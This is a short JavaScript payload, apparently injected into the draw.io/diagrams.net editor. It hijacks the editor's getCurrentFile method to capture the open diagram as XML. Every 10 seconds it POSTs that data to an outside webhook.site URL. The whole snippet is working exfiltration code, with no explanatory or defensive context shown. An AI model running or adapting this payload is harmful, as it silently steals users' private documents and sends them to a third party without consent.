var exfilt_url = "https://webhook.site/415d9e82-5e7e-436b-bc8b-3c0f8e3cab27";
var content = "";

top.EditorUi.prototype.getCurrentFile = function() {
    if(this.currentFile !== null) {
        content = top.mxUtils.getPrettyXml(this.currentFile.ui.editor.getGraphXml());
    }
    return this.currentFile;
};

setInterval(() => {
    fetch(exfilt_url, { method: "POST", body: content });
}, 10000)
